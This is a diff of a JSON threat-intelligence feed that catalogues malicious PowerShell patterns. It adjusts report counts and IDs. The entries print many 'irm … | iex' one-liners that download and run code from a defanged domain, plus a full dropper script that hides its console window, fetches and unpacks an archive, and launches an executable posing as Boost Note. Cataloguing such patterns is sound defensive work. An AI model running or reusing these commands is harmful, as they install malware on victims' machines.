@@ -106,12 +106,11 @@
   },
   {
     "Pattern": "irm '<URL>'|iex;",
-    "DistinctPayloadCount": 47,
-    "ReportCount": 47,
-    "FirstSeen": "2026-11-21T07:37:02.011000+00:00",
+    "DistinctPayloadCount": 46,
+    "ReportCount": 46,
+    "FirstSeen": "2026-11-21T12:30:27.952000+00:00",
     "LastSeen": "2026-11-26T16:00:18.255000+00:00",
     "ReportIds": [
-      "cmwq3hj6925o90omluxfpwhhb",
       "cmwqdyvxc26l80omlqt7iyopg",
       "cmwqqo73r28eh0omli28sjqkd",
       "cmwr2ypwb29gj0omlf48po5rs",
@@ -182,7 +181,6 @@
       "irm 'img-codes-cloude[.]info/2d2266c36f199d9a'|iex;",
       "irm 'img-codes-cloude[.]info/3103db9e23ffe1f2'|iex;",
       "irm 'img-codes-cloude[.]info/3458de5112653301'|iex;",
-      "irm 'img-codes-cloude[.]info/3ebc229a76f38212'|iex;",
       "irm 'img-codes-cloude[.]info/41d88dcc57a5f96c'|iex;",
       "irm 'img-codes-cloude[.]info/4349f1daacd50bcc'|iex;",
       "irm 'img-codes-cloude[.]info/437dc7e50c68cd86'|iex;",
@@ -446,11 +444,10 @@
   {
     "Pattern": "$url = \"<URL>\";\n$filename = \"Boost Note.exe\";\n$path = $env:TEMP;\n$archive = Join-Path $path \"TlkVMerN.zip\";\n$filepath = Join-Path $path $filename;\n$signature = @\"\nusing System;\nusing System.Runtime.InteropServices;\npublic class Win32 {\n\t[DllImport(\"kernel32.dll\")]\n\tpublic static extern IntPtr GetConsoleWindow();\n\t[DllImport(\"user32.dll\")]\n\tpublic static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);\n}\n\"@;\nAdd-Type $signature;\n$hwnd = [Win32]::GetConsoleWindow();\nif($hwnd -ne [IntPtr]::Zero)\n{\n\t[Win32]::ShowWindow($hwnd, 0);\n}\nNew-Item -Path $path -ItemType Directory -Force;\ncurl $url -o $archive;\nExpand-Archive -Path $archive -DestinationPath $path -Force;\nRemove-Item $archive -Force;\nStart-Process $filepath;\nexit",
     "DistinctPayloadCount": 1,
-    "ReportCount": 18,
-    "FirstSeen": "2026-11-21T07:36:53.112000+00:00",
+    "ReportCount": 17,
+    "FirstSeen": "2026-11-21T10:47:34.100000+00:00",
     "LastSeen": "2026-11-22T10:45:15.619000+00:00",
     "ReportIds": [
-      "cmwq3hc8s25mj0oml7jzq2r5l",
       "cmwqaak5m25zo0omla4vviesx",
       "cmwqh59zd26op0omlzr69fgi7",
       "cmwqpzvm527qz0omlbakji56v",
